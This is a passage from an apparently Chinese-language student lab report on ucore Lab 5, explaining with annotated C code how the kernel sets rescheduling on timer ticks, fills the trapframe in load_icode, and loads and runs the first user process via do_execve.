class="comment">//这里主要是设置相应的中断门</span></span><br><span class="line">        lidt(&amp;idt_pd);</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         传入的第一个参数gate是中断的描述符表</span></span><br><span class="line"><span class="comment">         传入的第二个参数istrap用来判断是中断还是trap</span></span><br><span class="line"><span class="comment">         传入的第三个参数sel的作用是进行段的选择</span></span><br><span class="line"><span class="comment">         传入的第四个参数off表示偏移</span></span><br><span class="line"><span class="comment">         传入的第五个参数dpl表示这个中断的优先级</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* LAB5 YOUR CODE */</span></span><br><span class="line">        <span class="comment">/* you should upate you lab1 code (just add ONE or TWO lines of code):</span></span><br><span class="line"><span class="comment">         *    Every TICK_NUM cycle, you should set current process's current-&gt;need_resched = 1</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">		ticks++;</span><br><span class="line">		<span class="keyword">if</span>(ticks%TICK_NUM == <span class="number">0</span>)&#123;<span class="comment">//每次时钟中断之后ticks就会加一 当加到TICK_NUM次数时 打印并重新开始</span></span><br><span class="line">-			<span class="comment">//print_ticks();//前面有定义 打印字符串</span></span><br><span class="line">+			assert(current != <span class="literal">NULL</span>);</span><br><span class="line">+			current-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">             <span class="comment">//将时间片设置为需要调度 说明当前进程的时间片已经用完了</span></span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="练习1-加载应用程序并执行"><a href="#练习1-加载应用程序并执行" class="headerlink" title="练习1: 加载应用程序并执行"></a>练习1: 加载应用程序并执行</h2><p><strong>do_execv</strong>函数调用load_icode（位于kern/process/proc.c中）来加载并解析一个处于内存中的ELF执行文件格式的应用程序，建立相应的用户内存空间来放置应用程序的代码段、数据段等，且要设置好proc_struct结构中的成员变量trapframe中的内容，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。需设置正确的trapframe内容。</p>
<p>请在实验报告中简要说明你的设计实现过程。</p>
<p>请在实验报告中描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p>
<h3 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h3><p>查看proc.c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* load_icode - load the content of binary program(ELF format) as the new content of current process</span></span><br><span class="line"><span class="comment"> * @binary:  the memory addr of the content of binary program</span></span><br><span class="line"><span class="comment"> * @size:  the size of the content of binary program</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">load_icode(<span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> <span class="built_in">size</span>) &#123;</span><br><span class="line">...</span><br><span class="line">    <span class="comment">//(6) setup trapframe for user environment</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line">    <span class="comment">/* LAB5:EXERCISE1 YOUR CODE</span></span><br><span class="line"><span class="comment">     * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span></span><br><span class="line"><span class="comment">     * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span></span><br><span class="line"><span class="comment">     *          tf_cs should be USER_CS segment (see memlayout.h)</span></span><br><span class="line"><span class="comment">     *          tf_ds=tf_es=tf_ss should be USER_DS segment</span></span><br><span class="line"><span class="comment">     *          tf_esp should be the top addr of user stack (USTACKTOP)</span></span><br><span class="line"><span class="comment">     *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span></span><br><span class="line"><span class="comment">     *          tf_eflags should be set to enable computer to produce Interrupt</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>根据注释补充代码得到</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下为要填写的内容 首先清空进程原先的中断帧 然后再将 中断帧中的 代码段 和 数据段</span></span><br><span class="line"><span class="comment">//修改为 用户态的段选择子 栈指针设置为 用户栈顶 eip 设置为 用户程序的入口地址</span></span><br><span class="line"><span class="comment">//最后 确保在用户进程中能够响应中断</span></span><br><span class="line">    tf-&gt;tf_cs = USER_CS;</span><br><span class="line">    tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">    tf-&gt;tf_esp = USTACKTOP;</span><br><span class="line">    tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">    tf-&gt;tf_eflags = FL_IF;<span class="comment">//FL_IF为开启中断状态</span></span><br></pre></td></tr></table></figure></div>
<h3 id="回答问题"><a href="#回答问题" class="headerlink" title="回答问题"></a>回答问题</h3><blockquote>
<p>请在实验报告中描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p>
</blockquote>
<p>查看user/hello.c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ulib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">void</span>) &#123;</span><br><span class="line">    cprintf(<span class="string">"Hello world!!.\n"</span>);</span><br><span class="line">    cprintf(<span class="string">"I am process %d.\n"</span>, getpid());</span><br><span class="line">    cprintf(<span class="string">"hello pass.\n"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>用户进程的虚拟地址空间</p>
<p>在<code>tools/user.ld</code>描述了用户程序的用户虚拟空间的执行入口虚拟地址：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">SECTIONS &#123;</span><br><span class="line">    <span class="comment">/* Load programs at this address: "." means the current address */</span></span><br><span class="line">    . = <span class="number">0x800020</span>;</span><br></pre></td></tr></table></figure></div>
<p>在<code>tools/kernel.ld</code>描述了操作系统的内核虚拟空间的起始入口虚拟地址：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">SECTIONS &#123;</span><br><span class="line">    <span class="comment">/* Load the kernel at this address: "." means the current address */</span></span><br><span class="line">    . = <span class="number">0xC0100000</span>;</span><br></pre></td></tr></table></figure></div>
<p>这样ucore将用户进程的虚拟地址空间分为了两个部分，<br>一部分是<strong>所有用户进程共享的内核地址空间，映射到同样的物理地址空间中</strong>。将内核代码放到此空间中，用户进程从用户态到内核态时，内核可以统一应对不同的内核程序。<br>另外一部分是<strong>用户虚拟地址空间，映射到不同且没有交集的物理内存空间中</strong>。用户进程的执行代码和数据放到用户地址空间时确保各个进程不会非法访问到其他进程的物理空间。</p>
<p>./kern/mm/memlayout.h中的虚存布局</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * Virtual memory map:                                          Permissions</span></span><br><span class="line"><span class="comment"> *                                                              kernel/user</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *     4G ------------------&gt; +---------------------------------+</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            |         Empty Memory (*)        |</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            +---------------------------------+ 0xFB000000</span></span><br><span class="line"><span class="comment"> *                            |   Cur. Page Table (Kern, RW)    | RW/-- PTSIZE</span></span><br><span class="line"><span class="comment"> *     VPT -----------------&gt; +---------------------------------+ 0xFAC00000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     KERNTOP -------------&gt; +---------------------------------+ 0xF8000000</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            |    Remapped Physical Memory     | RW/-- KMEMSIZE</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *     KERNBASE ------------&gt; +---------------------------------+ 0xC0000000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     USERTOP -------------&gt; +---------------------------------+ 0xB0000000</span></span><br><span class="line"><span class="comment"> *                            |           User stack            |</span></span><br><span class="line"><span class="comment"> *                            +---------------------------------+</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            :                                 :</span></span><br><span class="line"><span class="comment"> *                            |         ~~~~~~~~~~~~~~~~        |</span></span><br><span class="line"><span class="comment"> *                            :                                 :</span></span><br><span class="line"><span class="comment"> *                            |                                 |</span></span><br><span class="line"><span class="comment"> *                            ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span></span><br><span class="line"><span class="comment"> *                            |       User Program &amp; Heap       |</span></span><br><span class="line"><span class="comment"> *     UTEXT ---------------&gt; +---------------------------------+ 0x00800000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *                            |  - - - - - - - - - - - - - - -  |</span></span><br><span class="line"><span class="comment"> *                            |    User STAB Data (optional)    |</span></span><br><span class="line"><span class="comment"> *     USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000</span></span><br><span class="line"><span class="comment"> *                            |        Invalid Memory (*)       | --/--</span></span><br><span class="line"><span class="comment"> *     0 -------------------&gt; +---------------------------------+ 0x00000000</span></span><br><span class="line"><span class="comment"> * (*) Note: The kernel ensures that "Invalid Memory" is *never* mapped.</span></span><br><span class="line"><span class="comment"> *     "Empty Memory" is normally unmapped, but user programs may map pages</span></span><br><span class="line"><span class="comment"> *     there if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * */</span></span><br></pre></td></tr></table></figure></div>
<p> <strong>创建并执行用户进程</strong></p>
<p>lab5中第一个进程是由第二个内核线程<code>initproc</code>通过把hello应用程序执行码覆盖到<code>initproc</code>的用户执行空间来创建的，相关代码如下所示：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERNEL_EXECVE(name, binary, size) (&#123;                          \</span></span><br><span class="line">            cprintf(<span class="string">"kernel_execve: pid = %d, name = \"%s\".\n"</span>,        \</span><br><span class="line">                    current-&gt;pid, name);                                \</span><br><span class="line">            kernel_execve(name, binary, (<span class="keyword">size_t</span>)(<span class="built_in">size</span>));                \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_EXECVE(x) (&#123;                                             \</span></span><br><span class="line">            <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> _binary_obj___user_#<span class="meta">#x##_out_start[],  \</span></span><br><span class="line">                _binary_obj___user_#<span class="meta">#x##_out_size[];                    \</span></span><br><span class="line">            __KERNEL_EXECVE(#x, _binary_obj___user_##x##_out_start,     \</span><br><span class="line">                            _binary_obj___user_##x##_out_size);         \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __KERNEL_EXECVE2(x, xstart, xsize) (&#123;                           \</span></span><br><span class="line">            <span class="keyword">extern</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> xstart[], xsize[];                     \</span><br><span class="line">            __KERNEL_EXECVE(#x, xstart, (<span class="keyword">size_t</span>)xsize);                 \</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KERNEL_EXECVE2(x, xstart, xsize)        __KERNEL_EXECVE2(x, xstart, xsize)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// user_main - kernel thread used to exec a user program</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">user_main(<span class="keyword">void</span> *arg) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> TEST</span></span><br><span class="line">    KERNEL_EXECVE2(TEST, TESTSTART, TESTSIZE);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    KERNEL_EXECVE(<span class="built_in">exit</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    panic(<span class="string">"user_main execve failed.\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>在<code>proc_init</code>函数中，通过<code>kernel_thread</code>来创建第二个内核线程<code>init_main</code>，<code>init_main</code>又调用<code>kernel_thread</code>来创建子进程<code>user_main</code> 。user_main在缺省的情况下执行宏<code>KERNEL_EXECVE(exit);</code> ，而这个宏最后是调用<code>kernel_execve</code> 来调用SYS_exec系统调用。由于ld在链接exit应用程序执行码时定义了两全局变量：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line">_binary_obj___user_exit_out_start<span class="comment">//exit执行码的起始位置</span></span><br><span class="line">_binary_obj___user_exit_out_size<span class="comment">//exit执行码的大小</span></span><br></pre></td></tr></table></figure></div>
<p><code>kernel_execve</code>把这两个变量作为SYS_exec系统调用的参数，让ucore来创建此用户进程。当ucore收到此系统调用后，将依次调用如下函数c</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">vector128(vectors.S)--&gt;__alltraps(trapentry.S)--&gt;trap(trap.c)--&gt;trap_dispatch(trap.c)--</span><br><span class="line">--&gt;syscall(syscall.c)--&gt;sys_exec（syscall.c）--&gt;do_execve(proc.c)</span><br></pre></td></tr></table></figure></div>
<p><strong>do_exceve函数调用了load_icode去加载ELF二进制格式文件到内存并执行</strong></p>
<p>do_execve函数主要做的工作就是先回收自身所占用户空间，然后调用load_icode，用新的程序覆盖内存空间，形成一个执行新程序的新进程</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// do_execve - call exit_mmap(mm)&amp;pug_pgdir(mm) to reclaim memory space of current process</span></span><br><span class="line"><span class="comment">//           - call load_icode to setup new memory space accroding binary prog.</span></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">do_execve(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> len, <span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> <span class="built_in">size</span>) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> = <span class="title">current</span>-&gt;<span class="title">mm</span>;</span></span><br><span class="line">    <span class="keyword">if</span> (!user_mem_check(mm, (<span class="keyword">uintptr_t</span>)name, len, <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> -E_INVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (len &gt; PROC_NAME_LEN) &#123;</span><br><span class="line">        len = PROC_NAME_LEN;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> local_name[PROC_NAME_LEN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(local_name, <span class="number">0</span>, <span class="keyword">sizeof</span>(local_name));</span><br><span class="line">    <span class="built_in">memcpy</span>(local_name, name, len);</span><br><span class="line"><span class="comment">//首先清空内存空间</span></span><br><span class="line">    <span class="keyword">if</span> (mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        lcr3(boot_cr3);<span class="comment">//切换为内核态</span></span><br><span class="line">        <span class="keyword">if</span> (mm_count_dec(mm) == <span class="number">0</span>) &#123;</span><br><span class="line">            exit_mmap(mm);<span class="comment">//清空内存管理部分和对应页表</span></span><br><span class="line">            put_pgdir(mm);<span class="comment">//清空页表</span></span><br><span class="line">            mm_destroy(mm);<span class="comment">//清空内存</span></span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;mm = <span class="literal">NULL</span>;<span class="comment">//将当前页表指向NULL</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line"><span class="comment">//然后向清空的内存中填充新的内容，调用load_icode函数</span></span><br><span class="line">    <span class="keyword">if</span> ((ret = load_icode(binary, <span class="built_in">size</span>)) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> execve_exit;</span><br><span class="line">    &#125;</span><br><span class="line">    set_proc_name(current, local_name);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">execve_exit:</span><br><span class="line">    do_exit(ret);</span><br><span class="line">    panic(<span class="string">"already exit: %e.\n"</span>, ret);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><img src="/images/loading.gif" data-original="/posts/c606d982/image-20200425202823845.png" alt="image-20200425202823845"></p>
<p>load_icode函数的主要工作就是给用户进程建立一个能够让用户进程正常运行的用户环境。其完成的工作如下:</p>
<ol>
<li><p>调用mm_create函数来申请进程的内存管理数据结构mm所需内存空间，并对mm进行初始化；</p>
</li>
<li><p>调用setup_pgdir来申请一个页目录表所需的一个页大小的内存空间，并把描述ucore内核虚空间映射的内核页表（boot_pgdir所指）的内容拷贝到此新目录表中，最后mm-&gt;pgdir指向此页目录表，这就是进程新的页目录表了，且能够正确映射内核。</p>
</li>
<li><p>根据应用程序执行码的起始位置来解析此ELF格式的执行程序，并调用mm_map函数根据ELF格式的执行程序说明的各个段（代码段、数据段、BSS段等）的起始位置和大小建立对应的vma结构，并把vma插入到mm结构中，从而表明了用户进程的合法用户态虚拟地址空间。</p>
</li>
<li><p>调用根据执行程序各个段的大小分配物理内存空间，并根据执行程序各个段的起始位置确定虚拟地址，并在页表中建立好物理地址和虚拟地址的映射关系，然后把执行程序各个段的内容拷贝到相应的内核虚拟地址中，至此应用程序执行码和数据已经根据编译时设定地址放置到虚拟内存中了；</p>
</li>
<li><p>需要给用户进程设置用户栈，为此调用mm_mmap函数建立用户栈的vma结构，明确用户栈的位置在用户虚空间的顶端，大小为256个页，即1MB，并分配一定数量的物理内存且建立好栈的虚地址&lt;—&gt;物理地址映射关系；</p>
</li>
<li><p>至此,进程内的内存管理vma和mm数据结构已经建立完成，于是把mm-&gt;pgdir赋值到cr3寄存器中，即更新了用户进程的虚拟内存空间，此时的initproc已经被hello的代码和数据覆盖，成为了第一个用户进程，但此时这个用户进程的执行现场还没建立好；</p>
</li>
<li><p>先清空进程的中断帧，再重新设置进程的中断帧，使得在执行中断返回指令“iret”后，能够让CPU转到用户态特权级，并回到用户态内存空间，使用用户态的代码段、数据段和堆栈，且能够跳转到用户进程的第一条指令执行，并确保在用户态能够响应中断；</p>
</li>
</ol>
<p>以下是load_icode函数的内容</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* load_icode - load the content of binary program(ELF format) as the new content of current process</span></span><br><span class="line"><span class="comment"> * @binary:  the memory addr of the content of binary program</span></span><br><span class="line"><span class="comment"> * @size:  the size of the content of binary program</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">load_icode(<span class="keyword">unsigned</span> <span class="keyword">char</span> *binary, <span class="keyword">size_t</span> <span class="built_in">size</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (current-&gt;mm != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        panic(<span class="string">"load_icode: current-&gt;mm must be empty.\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//准备部分：当前进程必须为空，这样才能加载到内存。</span></span><br><span class="line"><span class="comment">//（在调用它的do_exceve函数中，如果没有bug，那么已经清空了）</span></span><br><span class="line">    <span class="keyword">int</span> ret = -E_NO_MEM;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>		<span class="comment">//声明了一个页表</span></span><br><span class="line">    <span class="comment">//(1) create a new mm for current process</span></span><br><span class="line">    <span class="comment">//第1步：为当前的进程创建一块内存</span></span><br><span class="line">    <span class="keyword">if</span> ((mm = mm_create()) == <span class="literal">NULL</span>) &#123;<span class="comment">//申请内存</span></span><br><span class="line">        <span class="keyword">goto</span> bad_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里调用了一个函数mm_create（kern/mm/vmm.c，43——60行）:</span></span><br><span class="line">    <span class="comment">// mm_create -  alloc a mm_struct &amp; initialize it.</span></span><br><span class="line">    <span class="comment">//struct mm_struct *</span></span><br><span class="line">    <span class="comment">//mm_create(void) &#123;</span></span><br><span class="line">    <span class="comment">//    struct mm_struct *mm = kmalloc(sizeof(struct mm_struct));</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//    if (mm != NULL) &#123;</span></span><br><span class="line">    <span class="comment">//        list_init(&amp;(mm-&gt;mmap_list));</span></span><br><span class="line">    <span class="comment">//        mm-&gt;mmap_cache = NULL;</span></span><br><span class="line">    <span class="comment">//        mm-&gt;pgdir = NULL;</span></span><br><span class="line">    <span class="comment">//        mm-&gt;map_count = 0;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        if (swap_init_ok) swap_init_mm(mm);</span></span><br><span class="line">    <span class="comment">//        else mm-&gt;sm_priv = NULL;</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//        set_mm_count(mm, 0);</span></span><br><span class="line">    <span class="comment">//        lock_init(&amp;(mm-&gt;mm_lock));</span></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    return mm;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//可以看到这个函数首先申请了一块内存空间 如果内存空间申请成功了 那么</span></span><br><span class="line">    <span class="comment">//就会把这个内存空间返回给外面调用它的mm变量 如果申请失败 那么新开</span></span><br><span class="line">    <span class="comment">//辟的空间都不存在 即为NULL 且会返回它自己 因此外部的判断条件是mm</span></span><br><span class="line">    <span class="comment">//不能等于NULL 如果等于NULL 说明创建空间失败了 否则 就能够说明创建成功 </span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//(2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT</span></span><br><span class="line">    <span class="comment">//第2步：调用 setup_pgdir来申请一个页目录表所需的一个页大小的内存空间</span></span><br><span class="line">    <span class="keyword">if</span> (setup_pgdir(mm) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad_pgdir_cleanup_mm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//这里调用了一个函数setup_pgdir（kern/process/proc.c，288——299行）</span></span><br><span class="line">    <span class="comment">// setup_pgdir - alloc one page as PDT</span></span><br><span class="line">    <span class="comment">//static int</span></span><br><span class="line">    <span class="comment">//setup_pgdir(struct mm_struct *mm) &#123;</span></span><br><span class="line">    <span class="comment">//    struct Page *page;</span></span><br><span class="line">    <span class="comment">//    if ((page = alloc_page()) == NULL) &#123;</span></span><br><span class="line">    <span class="comment">//        return -E_NO_MEM;</span></span><br><span class="line">    <span class="comment">//    &#125;</span></span><br><span class="line">    <span class="comment">//    pde_t *pgdir = page2kva(page);</span></span><br><span class="line">    <span class="comment">//    memcpy(pgdir, boot_pgdir, PGSIZE);</span></span><br><span class="line">    <span class="comment">//    pgdir[PDX(VPT)] = PADDR(pgdir) | PTE_P | PTE_W;</span></span><br><span class="line">    <span class="comment">//    mm-&gt;pgdir = pgdir;</span></span><br><span class="line">    <span class="comment">//    return 0;</span></span><br><span class="line">    <span class="comment">//&#125;</span></span><br><span class="line">    <span class="comment">//如果没有返回0 那么分配页目录表失败 因此程序需要判断为0的情况 </span></span><br><span class="line">    <span class="comment">//到一个错误的状态</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//(3) copy TEXT/DATA section, build BSS parts in binary to memory space of process</span></span><br><span class="line">    <span class="comment">//第3步：读取ELF格式的文件，在内存中复制该进程所需要的代码段等信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Page</span> *<span class="title">page</span>;</span><span class="comment">//申请一个页</span></span><br><span class="line">    <span class="comment">//(3.1) get the file header of the bianry program (ELF format)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">elfhdr</span> *<span class="title">elf</span> = (<span class="title">struct</span> <span class="title">elfhdr</span> *)<span class="title">binary</span>;</span><span class="comment">//获取ELF格式文件的表头</span></span><br><span class="line">    <span class="comment">//在bootloader启动的过程中 已经将ucore内核和用户代码全部加载到内存</span></span><br><span class="line">    <span class="comment">//因为没有文件管理系统 我们只需要关注这个代码在内存中的哪里 找到了</span></span><br><span class="line">    <span class="comment">//开头就能根据它找到数据段</span></span><br><span class="line">    <span class="comment">//(3.2) get the entry of the program section headers of the bianry program (ELF format)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span> = (<span class="title">struct</span> <span class="title">proghdr</span> *)(<span class="title">binary</span> + <span class="title">elf</span>-&gt;<span class="title">e_phoff</span>);</span></span><br><span class="line">    <span class="comment">//(3.3) This program is valid?</span></span><br><span class="line">    <span class="keyword">if</span> (elf-&gt;e_magic != ELF_MAGIC) &#123;<span class="comment">//这个ELF文件的格式是否是合法</span></span><br><span class="line">        ret = -E_INVAL_ELF;<span class="comment">//返回一个ELF文件非法操作</span></span><br><span class="line">        <span class="keyword">goto</span> bad_elf_cleanup_pgdir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> vm_flags, perm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph_end</span> = <span class="title">ph</span> + <span class="title">elf</span>-&gt;<span class="title">e_phnum</span>;</span></span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; ph_end; ph ++) &#123;</span><br><span class="line">    <span class="comment">//(3.4) find every program section headers</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_type != ELF_PT_LOAD) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) &#123;</span><br><span class="line">            ret = -E_INVAL_ELF;</span><br><span class="line">            <span class="keyword">goto</span> bad_cleanup_mmap;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_filesz == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//这个地方获取的是文件的各个段，包括代码段、数据段等。</span></span><br><span class="line">    <span class="comment">//(3.5) call mm_map fun to setup the new vma ( ph-&gt;p_va, ph-&gt;p_memsz)</span></span><br><span class="line">    <span class="comment">//根据获取的各个段的开头，以及虚拟地址创建VMA</span></span><br><span class="line">    <span class="comment">//（管理进程所认为的合法空间）一开始给各个段赋予了一些属性：</span></span><br><span class="line">        vm_flags = <span class="number">0</span>, perm = PTE_U;</span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC;<span class="comment">//可执行属性（代码段）</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE;<span class="comment">//可读可写（数据段）</span></span><br><span class="line">        <span class="keyword">if</span> (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ;</span><br><span class="line">        <span class="keyword">if</span> (vm_flags &amp; VM_WRITE) perm |= PTE_W;</span><br><span class="line">        <span class="keyword">if</span> ((ret = mm_map(mm, ph-&gt;p_va, 